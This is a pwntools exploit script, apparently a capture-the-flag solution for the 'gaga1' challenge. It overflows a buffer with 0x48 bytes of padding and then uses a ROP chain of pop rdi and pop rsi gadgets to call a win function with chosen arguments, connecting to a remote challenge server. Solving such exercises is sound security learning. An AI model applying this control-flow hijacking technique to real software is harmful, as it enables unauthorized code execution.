from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./gaga1')

p = remote('challs.actf.co', '31301')
# p = process('./gaga1')
pause()

pop_rdi_ret = 0x00000000004013b3
pop_rsi_r15_ret = 0x00000000004013b1
win_addr = 0x00401236

payload = flat(
    b'a' * 0x48,
    pop_rdi_ret,
    0x1337,
    pop_rsi_r15_ret,
    0x4141,
    0,
    win_addr,    
)
p.sendlineafter(b'input: ', payload)

p.interactive()